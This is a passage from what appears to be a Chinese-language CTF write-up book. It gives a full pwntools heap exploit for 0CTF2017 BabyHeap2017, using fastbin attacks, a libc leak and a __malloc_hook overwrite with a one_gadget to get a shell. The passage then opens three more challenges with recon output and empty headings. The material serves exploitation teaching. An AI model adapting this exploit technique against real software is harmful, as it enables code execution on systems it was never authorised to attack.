Bingo!!!
$ python exp.py
[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] leak => 0x7f8c1be9eb78
[*] libc => 0x7f8c1bada000
[*] __malloc_hook => 0x7f8c1be9eb10
[*] one_gadget => 0x7f8c1bb1f26a
[*] Switching to interactive mode
$ whoami
firmy
1079
6.1.10 pwn 0CTF2017 BabyHeap2017
本题多次使用 fastbin attack，确实经典。
exploit
完整的 exp 如下：
from pwn import *
io = remote('127.0.0.1', 10001)
def alloc(size):
io.recvuntil("Command: ")
io.sendline('1')
io.recvuntil("Size: ")
io.sendline(str(size))
def fill(idx, cont):
io.recvuntil("Command: ")
io.sendline('2')
io.recvuntil("Index: ")
io.sendline(str(idx))
io.recvuntil("Size: ")
io.sendline(str(len(cont)))
io.recvuntil("Content: ")
io.send(cont)
def free(idx):
io.recvuntil("Command: ")
io.sendline('3')
io.recvuntil("Index: ")
io.sendline(str(idx))
def dump(idx):
io.recvuntil("Command: ")
io.sendline('4')
io.recvuntil("Index: ")
io.sendline(str(idx))
io.recvuntil("Content: \n")
data = io.recvline()
1080
6.1.10 pwn 0CTF2017 BabyHeap2017
return data
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)
#fill(0, "A"*16)
#fill(1, "A"*16)
#fill(2, "A"*16)
#fill(3, "A"*16)
#fill(4, "A"*128)
free(1)
free(2)
payload = "A"*16
payload += p64(0)
payload += p64(0x21)
payload += p64(0)
payload += "A"*8
payload += p64(0)
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)
payload = "A"*16
payload += p64(0)
payload += p64(0x21)
fill(3, payload)
alloc(0x10)
alloc(0x10)
#fill(1, "B"*16)
#fill(2, "C"*16)
#fill(4, "D"*16)
payload = "A"*16
payload += p64(0)
payload += p64(0x91)
1081
6.1.10 pwn 0CTF2017 BabyHeap2017
fill(3, payload)
alloc(0x80)
#fill(5, "A"*128)
free(4)
leak = u64(dump(2)[:8])
libc = leak - 0x3c4b78 # 0x3c4b78 = leak - libc
__malloc_hook = libc + 0x3c4b10 # readelf -s libc.so.6 | grep
__malloc_hook@
one_gadget = libc + 0x4526a
log.info("leak => 0x%x" % leak)
log.info("libc => 0x%x" % libc)
log.info("__malloc_hook => 0x%x" % __malloc_hook)
log.info("one_gadget => 0x%x" % one_gadget)
alloc(0x60)
free(4)
payload = p64(libc + 0x3c4afd)
fill(2, payload)
alloc(0x60)
alloc(0x60)
payload = p8(0)*3
payload += p64(one_gadget)
fill(6, payload)
alloc(1)
io.interactive()
参考资料
0ctf Quals 2017 - BabyHeap2017
how2heap
1082
6.1.10 pwn 0CTF2017 BabyHeap2017
1083
6.1.11 pwn 9447CTF2015 Search-Engine
6.1.11 pwn 9447CTF2015 Search-Engine
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file search
search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dyn
amically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GN
U/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6f
b3343f, stripped
$ checksec -f search
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 1 3 search
64 位程序，开启了 NX 和 Canary。
玩一下，看名字就知道是一个搜索引擎，大概流程是这样的，首先给词库加入一些
句子，句子里的单词以空格间隔开，然后可以搜索所有包含某单词的句子，当找到
某条句子后，将其打印出来，并询问是否删除。
1084
6.1.11 pwn 9447CTF2015 Search-Engine
$ ./search
1: Search with a word
2: Index a sentence
3: Quit
2
Enter the sentence size:
10
Enter the sentence:
hello aaaa
Added sentence
1: Search with a word
2: Index a sentence
3: Quit
2
Enter the sentence size:
10
Enter the sentence:
hello bbbb
Added sentence
1: Search with a word
2: Index a sentence
3: Quit
1
Enter the word size:
5
Enter the word:
hello
Found 10: hello bbbb
Delete this sentence (y/n)?
y
Deleted!
Found 10: hello aaaa
Delete this sentence (y/n)?
n
1: Search with a word
2: Index a sentence
3: Quit
3
1085
6.1.11 pwn 9447CTF2015 Search-Engine
根据经验，这是一道堆利用的题目。
题目解析
漏洞利用
参考资料
how2heap
1086
6.1.12 pwn N1CTF2018 vote
6.1.12 pwn N1CTF2018 vote
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
这个题目给了二进制文件和 libc：
$ file vote
vote: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynam
ically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/
Linux 2.6.32, BuildID[sha1]=53266adcfdcb7b21a01e9f2a1cb0396b818b
fba3, stripped
$ checksec -f vote
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 4 vote
看起来就是个堆利用的问题：
$ ./vote
0: Create
1: Show
2: Vote
3: Result
4: Cancel
5: Exit
Action:
1087
6.1.12 pwn N1CTF2018 vote
然后就可以把它运行起来了：
$ socat tcp4-listen:10001,reuseaddr,fork exec:"env LD_PRELOAD=./
libc-2.23.so ./vote" &
另外出题人在 github 开源了题目的代码，感兴趣的也可以看一下。
题目解析
漏洞利用
参考资料
https://ctftime.org/task/5490
1088
6.1.13 pwn 34C3CTF2017 readme_revenge
6.1.13 pwn 34C3CTF2017 readme_revenge
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
这个题目实际上非常有趣。
$ file readme_revenge
readme_revenge: ELF 64-bit LSB executable, x86-64, version 1 (GN
U/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]
=2f27d1b57237d1ab23f8d0fc3cd418994c5b443d, not stripped
$ checksec -f readme_revenge
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 3 45 readme_r
evenge
与我们经常接触的题目不同，这是一个静态链接程序，运行时不需要加载 libc。not
stripped 绝对是个好消息。
1089
6.1.13 pwn 34C3CTF2017 readme_revenge
$ ./readme_revenge
aaaa
Hi, aaaa. Bye.
$ ./readme_revenge
%x.%d.%p
Hi, %x.%d.%p. Bye.
$ python -c 'print("A"*2000)' > crash_input
$ ./readme_revenge  pdf @ main
;-- main:
/ (fcn) sym.main 80
| sym.main (int arg_1020h);
| ; arg int arg_1020h @ rsp+0x1020
| ; DATA XREF from 0x0040091d (entry0)
| 0x00400a0d 55 push rbp
| 0x00400a0e 4889e5 mov rbp, rsp
| 0x00400a11 488da424e0ef. lea rsp, [rsp - 0x102
0]
| 0x00400a19 48830c2400 or qword [rsp], 0
| 0x00400a1e 488da4242010. lea rsp, [arg_1020h]
; 0x1020
| 0x00400a26 488d35b3692b. lea rsi, obj.name
; 0x6b73e0
| 0x00400a2d 488d3d50c708. lea rdi, [0x0048d184]
; "%s"
| 0x00400a34 b800000000 mov eax, 0
| 0x00400a39 e822710000 call sym.__isoc99_sca
nf
| 0x00400a3e 488d359b692b. lea rsi, obj.name
; 0x6b73e0